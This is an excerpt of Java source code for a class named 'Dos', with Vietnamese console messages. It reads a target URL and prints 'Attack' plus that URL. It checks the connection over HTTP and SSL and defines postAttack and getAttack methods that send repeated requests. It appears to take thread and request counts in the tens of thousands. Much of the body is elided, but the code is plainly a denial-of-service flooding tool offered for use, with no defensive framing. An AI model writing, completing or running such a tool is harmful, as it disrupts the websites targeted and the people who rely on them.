...
public class Dos implements Runnable {
    ...
    public static void main(String[] args) throws Exception {
        ...
        url = in.nextLine();
        System.out.println("\n");
        System.out.println("Attack : " + url);

        String[] SUrl = url.split("://");

        System.out.println("Dang ket noi voi sever");
        ...
        System.out.println("Nhap vao thg ngu 170000 & 4000");

        System.out.print(" Dang check  : ");
        ...
        System.out.println("MOD  chinh ket thuc");
    }
    ...
    private void checkConnection(String url) throws Exception {
        ...
        if (responseCode == 200) {
            System.out.println("Da ket noi den website");
        }
        Dos.url = url;
    }

    private void sslCheckConnection(String url) throws Exception {
        System.out.println("Kiem tra ket noi (ssl)");
        URL obj = new URL(url);
        ...
        int responseCode = con.getResponseCode();
        if (responseCode == 200) {
            System.out.println("Da ket noi voi Website");
        }
        Dos.url = url;
    }
    ...
    private void postAttack(String url) throws Exception {
        ...
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("Proxy : " + responseCode + " Du lieu truyen ve  : " + this.seq);
    }
    ...
    private void getAttack(String url) throws Exception {
        ...
        int responseCode = con.getResponseCode();
        System.out.println("Chac la ko gion dauuu ! : " + responseCode + " Du lieu truyen ve  : " + this.seq);
    }
